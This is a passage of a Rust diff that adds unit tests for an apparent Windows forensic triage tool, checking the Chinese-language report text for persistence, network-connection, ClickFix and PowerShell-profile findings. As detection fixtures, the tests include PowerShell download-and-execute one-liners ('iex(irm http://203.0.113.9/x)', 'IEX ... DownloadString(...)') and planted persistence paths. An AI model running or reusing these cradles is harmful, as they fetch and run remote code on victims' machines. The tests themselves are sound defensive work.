+                    r"C:\Users\a\AppData\Local\Sysinternals\procexp64.exe",
+                    Some(true),
+                    None,
+                ))],
+                &[],
+            )
+            .unwrap();
+        assert_eq!(findings.len(), 1);
+        let mut f = findings.into_iter().next().unwrap();
+        f.host = "WS01".into();
+        fill_details_client(&mut f, run_time());
+        let text = f.details_client.clone().unwrap();
+        assert_eq!(
+            text.contains("幾乎僅用於攻擊"),
+            matches!(f.severity, Severity::High | Severity::Critical),
+            "{:?}: {text}",
+            f.severity
+        );
+        // And the Medium wording itself, independent of persist's grading.
+        let mut m = f.clone();
+        m.severity = Severity::Medium;
+        m.details_client = None;
+        fill_details_client(&mut m, run_time());
+        let text = m.details_client.unwrap();
+        assert!(text.contains("Process Explorer"), "{text}");
+        assert!(!text.contains("幾乎僅用於攻擊"), "{text}");
+    }
+
+    #[test]
+    fn real_winlogon_finding_mentions_value() {
+        let text = persist_text(prec(
+            Mechanism::Winlogon,
+            r"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon",
+            Some("Shell"),
+            r"explorer.exe,C:\Users\Public\evil.exe",
+            None,
+            None,
+        ));
+        assert!(text.contains("Winlogon Shell"), "{text}");
+    }
+
+    #[test]
+    fn real_scheduled_task_finding_names_task() {
+        let text = persist_text(prec(
+            Mechanism::ScheduledTask,
+            r"\Microsoft\Windows\Updater",
+            Some("Updater"),
+            r"C:\ProgramData\upd\upd.exe",
+            Some(false),
+            None,
+        ));
+        assert!(text.contains("排程工作 Updater"), "{text}");
+        assert!(text.contains("upd.exe"), "{text}");
+    }
+
+    #[test]
+    fn real_catalog_mechanism_uses_its_own_label() {
+        let text = persist_text(prec(
+            Mechanism::AppinitDlls,
+            r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows",
+            Some("AppInit_DLLs"),
+            r"C:\Users\Public\hook.dll",
+            None,
+            None,
+        ));
+        assert!(text.contains("「AppInit_DLLs」"), "{text}");
+        assert!(text.contains("hook.dll"), "{text}");
+    }
+
+    /// The registry data names a vendor binary: the text never says "未知程式".
+    #[test]
+    fn real_service_text_is_never_unknown_program() {
+        let text = persist_text(prec(
+            Mechanism::Service,
+            r"HKLM\SYSTEM\CurrentControlSet\Services\CoworkVMService",
+            Some("CoworkVMService"),
+            r#""C:\Tools\cowork-svc.exe""#,
+            None,
+            Some(run_time() - Duration::days(1)),
+        ));
+        assert!(!text.contains("未知程式"), "{text}");
+        assert!(text.contains("cowork-svc.exe"), "{text}");
+    }
+
+    #[test]
+    fn real_clickfix_finding_quotes_the_typed_command() {
+        let rv = RegValueRecord {
+            hive: "HKCU".into(),
+            key: r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU".into(),
+            value: "a".into(),
+            data: r"powershell -w h -c iex(irm http://203.0.113.9/x)\1".into(),
+            last_write: None,
+            mru_rank: None,
+        };
+        let mut f = cairn_heur::ClickFixHeuristic
+            .analyze(&[Record::RegValue(rv)], &[])
+            .unwrap()
+            .remove(0);
+        assert!(
+            f.details_client.is_none(),
+            "analyzer leaves wording to report"
+        );
+        fill_details_client(&mut f, run_time());
+        let text = f.details_client.unwrap();
+        assert!(text.contains("Win+R"), "{text}");
+        assert!(text.contains("irm http://203.0.113.9/x"), "{text}");
+    }
+
+    // ── netconn: owning process naming ───────────────────────────────────────
 
     #[test]
     fn netconn_client_text_includes_process_name() {
-        let mut f = Finding::new(Severity::High, "test", FindingSource::Heuristic);
-        f.host = "WS01".into();
-        f.artifact = "netconn".into();
+        let mut f = make_heuristic(Severity::High, analyzers::NETCONN);
         f.entity.netconn = Some(EntityNetConn {
             laddr: "192.168.0.1".into(),
             lport: 50000,
@@ -457,19 +781,103 @@ mod tests {
             signed: None,
             integrity: None,
         });
-        fill_details_client(&mut f);
+        fill_details_client(&mut f, run_time());
         let text = f.details_client.unwrap();
         assert!(text.contains("beacon.exe"), "must name process: {text}");
-        assert!(text.contains("WS01"), "must name host: {text}");
+        assert!(text.contains("185.0.0.1:4444"), "{text}");
     }
 
-    // ── R5: netconn without owning process still produces text ───────────────
+    fn netconn_text(conn: cairn_core::record::NetConnRecord, owner: ProcessRecordT) -> String {
+        let records = [Record::NetConn(conn), Record::Process(owner)];
+        let mut findings = cairn_heur::NetConnHeuristic.analyze(&records, &[]).unwrap();
+        assert_eq!(findings.len(), 1, "{findings:?}");
+        let mut f = findings.remove(0);
+        f.host = "WS01".into();
+        fill_details_client(&mut f, run_time());
+        f.details_client.unwrap()
+    }
+
+    type ProcessRecordT = cairn_core::record::ProcessRecord;
+
+    fn owner_proc(image: &str, signed: Option<bool>) -> ProcessRecordT {
+        ProcessRecordT {
+            pid: 7,
+            ppid: 4,
+            image: image.into(),
+            cmdline: String::new(),
+            signed,
+            signer: None,
+            binary_sha256: None,
+            integrity: None,
+            user: None,
+            start_time: None,
+            signer_source: None,
+        }
+    }
+
+    #[test]
+    fn netconn_text_says_inbound_for_an_exposed_rdp_session() {
+        let text = netconn_text(
+            cairn_core::record::NetConnRecord {
+                proto: "tcp".into(),
+                laddr: "10.0.0.5".into(),
+                lport: 3389,
+                raddr: Some("45.33.32.156".into()),
+                rport: Some(51234),
+                state: Some("established".into()),
+                pid: Some(7),
+            },
+            owner_proc(r"C:\Windows\System32\svchost.exe", Some(true)),
+        );
+        assert!(text.contains("連入本機連接埠 3389"), "{text}");
+        assert!(!text.contains("發起了對外連線"), "{text}");
+    }
+
+    #[test]
+    fn netconn_text_says_listening_for_a_listener() {
+        let text = netconn_text(
+            cairn_core::record::NetConnRecord {
+                proto: "tcp".into(),
+                laddr: "0.0.0.0".into(),
+                lport: 4444,
+                raddr: Some("0.0.0.0".into()),
+                rport: Some(0),
+                state: Some("listen".into()),
+                pid: Some(7),
+            },
+            owner_proc(r"C:\Users\a\AppData\Local\Temp\x.exe", Some(false)),
+        );
+        assert!(text.contains("正在監聽連接埠 4444"), "{text}");
+        assert!(!text.contains("發起了對外連線"), "{text}");
+    }
+
+    #[test]
+    fn ps_profile_text_matches_what_was_found() {
+        let text = persist_text(prec(
+            Mechanism::PsProfile,
+            r"C:\Users\a\Documents\WindowsPowerShell\profile.ps1",
+            None,
+            "[System.Net.WebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy('http://proxy.corp:8080')",
+            None,
+            None,
+        ));
+        assert!(text.contains("含有網址"), "{text}");
+        assert!(!text.contains("下載或編碼指令，建議立即調查"), "{text}");
+        let text = persist_text(prec(
+            Mechanism::PsProfile,
+            r"C:\Users\a\Documents\WindowsPowerShell\profile.ps1",
+            None,
+            "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')",
+            None,
+            None,
+        ));
+        assert!(text.contains("下載或編碼指令"), "{text}");
+    }
 
     #[test]
     fn netconn_client_text_without_process_graceful() {
-        let mut f = Finding::new(Severity::High, "test", FindingSource::Heuristic);
-        f.host = "WS01".into();
-        f.artifact = "netconn".into();
+        let mut f = make_heuristic(Severity::High, analyzers::NETCONN);
+        f.entity.process = None;
         f.entity.netconn = Some(EntityNetConn {
             laddr: "0.0.0.0".into(),
             lport: 50000,
@@ -477,9 +885,83 @@ mod tests {
             rport: Some(4444),
             pid: Some(9999),
         });
-        fill_details_client(&mut f);
+        fill_details_client(&mut f, run_time());
         let text = f.details_client.unwrap();
-        assert!(!text.is_empty(), "must still produce text: {text}");
+        assert!(text.contains("未知程式"), "{text}");
         assert!(text.contains("WS01"));
+    }
+
+    #[test]
+    fn inventory_categories_read_in_zh_tw() {
+        let svc = observation_category_label(cairn_heur::eventlog::OBS_SERVICE_INSTALL);
+        assert!(
+            svc.contains("服務與驅動程式") && svc.contains("service_install"),
+            "{svc}"
+        );
+        assert!(observation_category_label("run_key").contains("Run 機碼"));
+        assert!(observation_category_label("logging_posture").contains("偵測盲點"));
+        // Unknown categories are shown as is, never as a guessed mechanism.
+        assert_eq!(observation_category_label("something_new"), "something_new");
+    }
+
+    /// A Sigma flood finding (several hits merged) says so instead of naming only its
+    /// first record.
+    #[test]
+    fn merged_sigma_flood_names_many_hits() {
+        let mut f = make_sigma(Severity::High, "Suspicious Service Installation");
+        f.artifact = "evtx:System".into();
+        f.event_id = Some(7045);
+        f.evidence_ref = Some("6287".into());
+        let line = sigma_rule_line(&f).unwrap();
+        assert!(
+            line.contains("record 6287") && !line.contains("多筆"),
+            "{line}"
+        );
+        for _ in 0..5 {
+            f.evidence.push(cairn_core::finding::EvidenceItem {
+                artifact: "evtx:System".into(),
+                path: None,
+                ts: Some(run_time()),
+                detail: "record".into(),
+            });
+        }
+        let line = sigma_rule_line(&f).unwrap();
+        assert!(
+            line.contains("共多筆") && line.contains("第一筆 record 6287"),
+            "{line}"
+        );
+    }
+
+    /// A finding the same-evidence rule merged (heur_lateral absorbing heur_eventlog's
+    /// finding on one 7045, produced by the real analyzers) keeps its own zh-TW text,
+    /// says it was merged, and is not replaced by a generic template.
+    #[test]
+    fn merged_finding_reads_correctly_in_zh_tw() {
+        let data =
+            serde_json::json!({"ServiceName": "KgX", "ImagePath": r"%SYSTEMROOT%\duKhLYUX.exe"});
+        let ev = Record::Event(cairn_core::record::EventRecord {
+            ts: run_time(),
+            channel: "System".into(),
+            event_id: 7045,
+            provider: "Service Control Manager".into(),
+            computer: "WS01".into(),
+            record_id: 2,
+            data: data.as_object().unwrap().clone(),
+        });
+        let analyzers: Vec<Box<dyn Analyzer>> = vec![
+            Box::new(cairn_heur::LateralHeuristic),
+            Box::new(cairn_heur::EventLogHeuristic),
+        ];
+        let out = cairn_core::orchestrator::run_analyzers(&[ev], &analyzers);
+        assert_eq!(out.findings.len(), 1, "{:#?}", out.findings);
+        let mut f = out.findings[0].clone();
+        fill_details_client(&mut f, run_time());
+        let text = f.details_client.unwrap();
+        assert!(
+            text.contains("KgX") && text.contains("已合併為這一筆"),
+            "{text}"
+        );
+        assert!(text.contains("事件記錄檢查"), "{text}");
+        assert_eq!(f.severity, Severity::High);
     }
 }
